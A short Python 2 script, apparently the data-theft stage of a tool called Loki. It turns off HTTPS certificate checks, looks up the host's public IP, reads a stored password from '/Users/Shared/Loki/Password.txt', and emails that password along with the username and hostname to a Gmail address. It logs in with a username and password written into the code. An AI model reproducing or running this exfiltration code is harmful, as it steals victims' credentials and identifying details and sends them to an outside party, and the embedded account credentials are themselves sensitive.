import smtplib
import socket
import getpass
from json import load
from urllib2 import urlopen

import os, ssl
if (not os.environ.get('PYTHONHTTPSVERIFY', '') and
getattr(ssl, '_create_unverified_context', None)):
    ssl._create_default_https_context = ssl._create_unverified_context

ip = load (urlopen ('http://jsonip.com'))['ip']
un = socket.gethostname () + ".modem"

from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText

msg = MIMEMultipart()
msg['From'] = 'th3ta403@gmail.com'
msg['To'] = 'th3ta403@gmail.com'
msg['Subject'] = socket.gethostname ()
with open('/Users/Shared/Loki/Password.txt') as f:
    first_line = f.readline ()
message = getpass.getuser() + "\n" + first_line + "\n" + ip + "\n" + un
msg.attach(MIMEText(message))

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login("th3ta403@gmail.com", "ylneldskrhoafmna")
server.sendmail(
  "th3ta403@gmail.com", 
  "th3ta403@gmail.com", 
  msg.as_string ())
server.quit()
